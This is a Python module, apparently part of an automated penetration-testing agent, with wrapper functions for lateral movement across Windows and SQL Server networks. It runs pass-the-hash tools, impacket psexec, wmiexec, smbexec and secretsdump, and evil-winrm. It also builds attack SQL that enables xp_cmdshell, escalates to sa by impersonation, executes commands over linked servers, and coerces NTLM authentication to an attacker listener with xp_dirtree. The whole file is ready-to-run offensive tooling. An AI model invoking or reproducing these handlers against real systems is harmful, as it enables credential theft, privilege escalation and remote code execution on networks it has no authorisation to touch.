"""LATERAL 阶段工具 handler：WinRM/RDP/SSH/PTH/impacket 横向移动、MSSQL 利用。"""

from __future__ import annotations

from typing import Any

from .executor import CommandBuilder, exec_builder, precheck


def _imp_spec(args: dict) -> str:
    """impacket domain/user:pass@target 形式。"""
    user = args.get("username", "")
    domain = args.get("domain", "")
    pwd = args.get("password", "")
    target = args.get("target", "")
    du = f"{domain}/{user}" if (domain and user) else user
    if du and pwd:
        return f"{du}:{pwd}@{target}"
    if du:
        return f"{du}@{target}"
    return target


def _imp_kerb(args: dict) -> list:
    """impacket Kerberos 认证参数 -k/-dc-ip/-aesKey/-hashes + target spec。"""
    out: list = ["-k", "-no-pass"]
    if args.get("target"):
        out += ["-dc-ip", str(args["target"])]
    if args.get("aes_key"):
        out += ["-aesKey", str(args["aes_key"])]
    elif args.get("hash"):
        out += ["-hashes", f":{args['hash']}"]
    user = args.get("username", "")
    domain = args.get("domain", "")
    du = f"{domain}/{user}" if (domain and user) else user
    out.append(f"{du}@{args.get('target', '')}" if du else args.get("target", ""))
    return out


def _pth_upn(args: dict) -> str:
    """pth 工具 DOMAIN\\USER%hash 形式。"""
    user = args.get("username", "")
    domain = args.get("domain", "")
    secret = args.get("hash") or args.get("password") or ""
    du = f"{domain}\\{user}" if domain else user
    return f"{du}%{secret}"


async def evil_winrm(args: dict, state: Any = None) -> str:
    """evil-winrm 远程 PowerShell。"""
    err, args = precheck("evil_winrm", args, state)
    if err:
        return err
    user = args.get("username", "")
    if args.get("domain"):
        user = f"{args['domain']}\\{user}"
    cb = CommandBuilder("evil-winrm").args("-i", str(args.get("target", "")), "-u", user)
    if args.get("password"):
        cb.args("-p", str(args["password"]))
    if args.get("port"):
        cb.args("-P", str(args["port"]))
    cb.timeout_secs(120)
    return await exec_builder(cb)


async def xfreerdp(args: dict, state: Any = None) -> str:
    """xfreerdp RDP 连接。"""
    err, args = precheck("xfreerdp", args, state)
    if err:
        return err
    target = args.get("target", "")
    cb = CommandBuilder("xfreerdp").args(f"/v:{target}")
    if args.get("username"):
        cb.args(f"/u:{args['username']}")
    if args.get("password"):
        cb.args(f"/p:{args['password']}")
    if args.get("domain"):
        cb.args(f"/d:{args['domain']}")
    cb.args("/cert-ignore", "+clipboard").timeout_secs(120)
    return await exec_builder(cb)


async def ssh_with_password(args: dict, state: Any = None) -> str:
    """sshpass + ssh 密码登录执行命令。"""
    err, args = precheck("ssh_with_password", args, state)
    if err:
        return err
    port = args.get("port") or 22
    user = args.get("username", "")
    target = args.get("target", "")
    cmd = args.get("command") or "id"
    cb = CommandBuilder("sshpass").args("-p", str(args.get("password", "")), "ssh")
    cb.args("-p", str(port), "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null")
    cb.args(f"{user}@{target}", cmd).timeout_secs(120)
    return await exec_builder(cb)


async def pth_winexe(args: dict, state: Any = None) -> str:
    """pth-winexe Pass-The-Hash 远程执行。"""
    err, args = precheck("pth_winexe", args, state)
    if err:
        return err
    cmd = args.get("command") or "whoami"
    cb = CommandBuilder("pth-winexe").args("--user", _pth_upn(args), f"//{args.get('target','')}", cmd).timeout_secs(120)
    return await exec_builder(cb)


async def pth_smbclient(args: dict, state: Any = None) -> str:
    """pth-smbclient Pass-The-Hash 访问共享。"""
    err, args = precheck("pth_smbclient", args, state)
    if err:
        return err
    cb = CommandBuilder("pth-smbclient").args("--user", _pth_upn(args), f"//{args.get('target','')}/C$").timeout_secs(120)
    return await exec_builder(cb)


async def pth_rpcclient(args: dict, state: Any = None) -> str:
    """pth-rpcclient Pass-The-Hash 枚举。"""
    err, args = precheck("pth_rpcclient", args, state)
    if err:
        return err
    cmd = args.get("command") or "enumdomusers"
    cb = CommandBuilder("pth-rpcclient").args("--user", _pth_upn(args), f"//{args.get('target','')}", "-c", cmd).timeout_secs(120)
    return await exec_builder(cb)


async def pth_wmic(args: dict, state: Any = None) -> str:
    """pth-wmic Pass-The-Hash WMI 查询。"""
    err, args = precheck("pth_wmic", args, state)
    if err:
        return err
    cmd = args.get("command") or "select * from Win32_ComputerSystem"
    cb = CommandBuilder("pth-wmic").args("--user", _pth_upn(args), f"//{args.get('target','')}", cmd).timeout_secs(120)
    return await exec_builder(cb)


async def psexec(args: dict, state: Any = None) -> str:
    """impacket-psexec 半交互式 shell。"""
    err, args = precheck("psexec", args, state)
    if err:
        return err
    cb = CommandBuilder("impacket-psexec")
    if args.get("hash"):
        cb.args("-hashes", f":{args['hash']}")
    cb.args(_imp_spec(args)).timeout_secs(180)
    return await exec_builder(cb)


async def psexec_kerberos(args: dict, state: Any = None) -> str:
    """impacket-psexec Kerberos 认证。"""
    err, args = precheck("psexec_kerberos", args, state)
    if err:
        return err
    cb = CommandBuilder("impacket-psexec").args(*_imp_kerb(args)).timeout_secs(180)
    return await exec_builder(cb)


async def wmiexec(args: dict, state: Any = None) -> str:
    """impacket-wmiexec 远程命令执行。"""
    err, args = precheck("wmiexec", args, state)
    if err:
        return err
    cb = CommandBuilder("impacket-wmiexec")
    if args.get("hash"):
        cb.args("-hashes", f":{args['hash']}")
    cb.args(_imp_spec(args))
    if args.get("command"):
        cb.args(str(args["command"]))
    cb.timeout_secs(180)
    return await exec_builder(cb)


async def wmiexec_kerberos(args: dict, state: Any = None) -> str:
    """impacket-wmiexec Kerberos 认证。"""
    err, args = precheck("wmiexec_kerberos", args, state)
    if err:
        return err
    cb = CommandBuilder("impacket-wmiexec").args(*_imp_kerb(args))
    if args.get("command"):
        cb.args(str(args["command"]))
    cb.timeout_secs(180)
    return await exec_builder(cb)


async def smbexec(args: dict, state: Any = None) -> str:
    """impacket-smbexec 远程命令执行。"""
    err, args = precheck("smbexec", args, state)
    if err:
        return err
    cb = CommandBuilder("impacket-smbexec")
    if args.get("hash"):
        cb.args("-hashes", f":{args['hash']}")
    cb.args(_imp_spec(args))
    if args.get("command"):
        cb.args(str(args["command"]))
    cb.timeout_secs(180)
    return await exec_builder(cb)


async def smbexec_kerberos(args: dict, state: Any = None) -> str:
    """impacket-smbexec Kerberos 认证。"""
    err, args = precheck("smbexec_kerberos", args, state)
    if err:
        return err
    cb = CommandBuilder("impacket-smbexec").args(*_imp_kerb(args))
    if args.get("command"):
        cb.args(str(args["command"]))
    cb.timeout_secs(180)
    return await exec_builder(cb)


async def secretsdump_kerberos(args: dict, state: Any = None) -> str:
    """impacket-secretsdump Kerberos 认证转储。"""
    err, args = precheck("secretsdump_kerberos", args, state)
    if err:
        return err
    cb = CommandBuilder("impacket-secretsdump").args(*_imp_kerb(args)).timeout_secs(300)
    return await exec_builder(cb)


async def get_tgt(args: dict, state: Any = None) -> str:
    """impacket-getTGT 获取 TGT。"""
    err, args = precheck("get_tgt", args, state)
    if err:
        return err
    cb = CommandBuilder("impacket-getTGT")
    if args.get("domain") and args.get("username"):
        cb.args(f"{args['domain']}/{args['username']}")
    if args.get("hash"):
        cb.args("-hashes", f":{args['hash']}")
    elif args.get("aes_key"):
        cb.args("-aesKey", str(args["aes_key"]))
    elif args.get("password"):
        cb.args("-p", str(args["password"]))
    if args.get("target"):
        cb.args("-dc-ip", str(args["target"]))
    cb.timeout_secs(120)
    return await exec_builder(cb)


def _mssql_base(args: dict) -> CommandBuilder:
    """impacket-mssqlclient 基础命令。"""
    port = args.get("port") or 1433
    user = args.get("username", "")
    pwd = args.get("password", "")
    target = args.get("target", "")
    cb = CommandBuilder("impacket-mssqlclient").args("-port", str(port), "-windows-auth")
    if user and pwd:
        cb.args(f"{user}:{pwd}@{target}")
    elif user:
        cb.args(f"{user}@{target}")
    else:
        cb.args(target)
    return cb


async def mssql_command(args: dict, state: Any = None) -> str:
    """MSSQL 执行 SQL 命令。"""
    err, args = precheck("mssql_command", args, state)
    if err:
        return err
    cb = _mssql_base(args).args("-q", str(args.get("command", "SELECT @@version"))).timeout_secs(120)
    return await exec_builder(cb)


async def mssql_enable_xp_cmdshell(args: dict, state: Any = None) -> str:
    """MSSQL 启用 xp_cmdshell。"""
    err, args = precheck("mssql_enable_xp_cmdshell", args, state)
    if err:
        return err
    sql = "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;"
    cb = _mssql_base(args).args("-q", sql).timeout_secs(120)
    return await exec_builder(cb)


async def mssql_enum_impersonation(args: dict, state: Any = None) -> str:
    """MSSQL 枚举可模拟（IMPERSONATE）权限。"""
    err, args = precheck("mssql_enum_impersonation", args, state)
    if err:
        return err
    sql = "SELECT grantee.name AS who, permission_name FROM sys.server_permissions sp JOIN sys.server_principals grantee ON sp.grantee_principal_id=grantee.principal_id WHERE state_desc='GRANT_WITH_GRANT_OPTION' AND permission_name='IMPERSONATE';"
    cb = _mssql_base(args).args("-q", sql).timeout_secs(120)
    return await exec_builder(cb)


async def mssql_impersonate(args: dict, state: Any = None) -> str:
    """MSSQL 模拟指定登录执行提权。"""
    err, args = precheck("mssql_impersonate", args, state)
    if err:
        return err
    as_user = args.get("as_user", "sa")
    sql = f"EXECUTE AS LOGIN = '{as_user}';SELECT SYSTEM_USER;REVERT;"
    cb = _mssql_base(args).args("-q", sql).timeout_secs(120)
    return await exec_builder(cb)


async def mssql_enum_linked_servers(args: dict, state: Any = None) -> str:
    """MSSQL 枚举链接服务器。"""
    err, args = precheck("mssql_enum_linked_servers", args, state)
    if err:
        return err
    sql = "SELECT sr.name, sl.remote_name FROM sys.servers sr LEFT JOIN sys.linked_logins sl ON sr.server_id=sl.server_id WHERE sr.is_linked=1;"
    cb = _mssql_base(args).args("-q", sql).timeout_secs(120)
    return await exec_builder(cb)


async def mssql_exec_linked(args: dict, state: Any = None) -> str:
    """MSSQL 通过链接服务器执行命令。"""
    err, args = precheck("mssql_exec_linked", args, state)
    if err:
        return err
    linked = args.get("linked_server", "")
    command = args.get("command", "whoami")
    sql = f"EXEC ('{command}') AT [{linked}];"
    cb = _mssql_base(args).args("-q", sql).timeout_secs(120)
    return await exec_builder(cb)


async def mssql_linked_enable_xpcmdshell(args: dict, state: Any = None) -> str:
    """MSSQL 通过链接服务器启用 xp_cmdshell。"""
    err, args = precheck("mssql_linked_enable_xpcmdshell", args, state)
    if err:
        return err
    linked = args.get("linked_server", "")
    sql = f"EXEC ('sp_configure ''show advanced options'',1;RECONFIGURE;sp_configure ''xp_cmdshell'',1;RECONFIGURE;') AT [{linked}];"
    cb = _mssql_base(args).args("-q", sql).timeout_secs(120)
    return await exec_builder(cb)


async def mssql_linked_xpcmdshell(args: dict, state: Any = None) -> str:
    """MSSQL 通过链接服务器的 xp_cmdshell 执行命令。"""
    err, args = precheck("mssql_linked_xpcmdshell", args, state)
    if err:
        return err
    linked = args.get("linked_server", "")
    command = args.get("command", "whoami")
    sql = f"EXEC ('xp_cmdshell ''{command}''') AT [{linked}];"
    cb = _mssql_base(args).args("-q", sql).timeout_secs(120)
    return await exec_builder(cb)


async def mssql_ntlm_coerce(args: dict, state: Any = None) -> str:
    """MSSQL xp_dirtree 强制 NTLM 认证（配合 ntlmrelayx 捕获）。"""
    err, args = precheck("mssql_ntlm_coerce", args, state)
    if err:
        return err
    listener = args.get("listener_ip", "")
    sql = f"EXEC xp_dirtree '\\\\{listener}\\share';"
    cb = _mssql_base(args).args("-q", sql).timeout_secs(60)
    return await exec_builder(cb)


__all__ = [
    "evil_winrm", "xfreerdp", "ssh_with_password", "pth_winexe", "pth_smbclient",
    "pth_rpcclient", "pth_wmic", "psexec", "psexec_kerberos", "wmiexec",
    "wmiexec_kerberos", "smbexec", "smbexec_kerberos", "secretsdump_kerberos",
    "get_tgt", "mssql_command", "mssql_enable_xp_cmdshell", "mssql_enum_impersonation",
    "mssql_impersonate", "mssql_enum_linked_servers", "mssql_exec_linked",
    "mssql_linked_enable_xpcmdshell", "mssql_linked_xpcmdshell", "mssql_ntlm_coerce",
]
